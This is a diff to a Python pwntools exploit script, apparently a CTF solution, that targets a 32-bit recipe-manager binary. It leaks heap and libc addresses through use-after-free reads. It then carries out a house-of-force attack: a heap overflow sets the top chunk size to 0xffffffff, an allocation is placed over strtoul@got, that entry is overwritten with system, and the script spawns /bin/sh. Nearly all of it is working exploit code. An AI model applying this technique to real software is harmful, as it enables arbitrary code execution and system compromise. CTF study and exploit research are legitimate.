@@ -11,7 +11,7 @@ import ctypes
 
 
 '''
-information leakage: 'ptr to the top chunk' can be leaked.
+### information leakage: 'ptr to the top chunk' can be leaked.
 
 * create recipe
 
@@ -52,7 +52,7 @@ binlist  [ptr to the top chunk] [NULL]
     }
 
 
-heap overflow:
+### heap overflow:
 
     case 'g':
         if ( CURRENT_RECIPE )
@@ -82,7 +82,9 @@ if __name__ == '__main__':
     s('babo')
 
 
-    # leak address in malloc heap (needed to do house-of-force)
+    #
+    # LEAK TOP CHUNK (needed to do house-of-force)
+    #
 
     s('c')
     s('n') # calloc(1, 0x40C)
@@ -90,7 +92,7 @@ if __name__ == '__main__':
     s('basil')
     s('1')
     
-    s('d') # free(). the first two dword's are overwritten with ptr to main_arena.binlist.
+    s('d') # free(). the first two dword's will be overwritten with ptr to main_arena.binlist.
 
     r.clean()
     s('p') # the first two dword's are treated as listheads.
@@ -103,6 +105,10 @@ if __name__ == '__main__':
     log.info('HEAP_BASE: 0x%x' % HEAP_BASE)
     
     r.recvuntil("[q]uit")
+
+    #
+    # CREATE FAKE CHUNK & LEAK calloc@got
+    #
 
     s('g') 
     r.recvuntil(":")
@@ -117,7 +123,7 @@ if __name__ == '__main__':
     s('c')
 
     r.clean()
-    s('p') # use after free
+    s('p') # *(CURRENT_RECIPE + 4) == 0x804d048, so 0x804d048 is treated as a listhead 
     resp = r.recvuntil("[q]uit")
    
     print resp
@@ -129,3 +135,35 @@ if __name__ == '__main__':
     LIBC_BASE = LEAKED - libc.symbols['calloc']
     log.info('LIBC_BASE: 0x%x' % LIBC_BASE)
 
+    NEW_TOP_CHUNK = TOP_CHUNK + (0x8ad5ae8-0x8ad56d8)
+    DEADBEEF = NEW_TOP_CHUNK - (0x8ad5ae8-0x8ad576c)
+
+    log.info('NEW_TOP_CHUNK: 0x%x' % NEW_TOP_CHUNK)
+    log.info('DEADBEEF: 0x%x' % DEADBEEF)
+
+    #
+    # exploit heap overflow & overwrite heap wilderness
+    #
+
+    s('n') # malloc()
+    s('g')
+    s('A'*(NEW_TOP_CHUNK - DEADBEEF) + p32(0) + p32(0xffffffff)) # fgets(...,1036,...)
+    s('q')
+
+    MAGIC_MALLOC = (STRTOUL_GOT - NEW_TOP_CHUNK - 16) & 0xffffffff
+    log.info('STRTOUL_GOT: 0x%x' % STRTOUL_GOT)
+    log.info('MAGIC_MALLOC: 0x%x' % MAGIC_MALLOC)
+   
+    s('g')
+    s(hex(MAGIC_MALLOC)) # malloc large amounts of memory and next malloc will overlap with strtoul@got
+    s('X')
+
+    s('g')
+    s('0x8') # this malloc will overlap with strtoul@got
+    s(p32(LIBC_BASE+SYSTEM_OFFSET))  # overwrite, now strtoul == system
+
+    s('g')
+    s('/bin/sh\0') # doning strtoul('/bin/sh\0') 
+    
+    r.clean()
+    r.interactive()
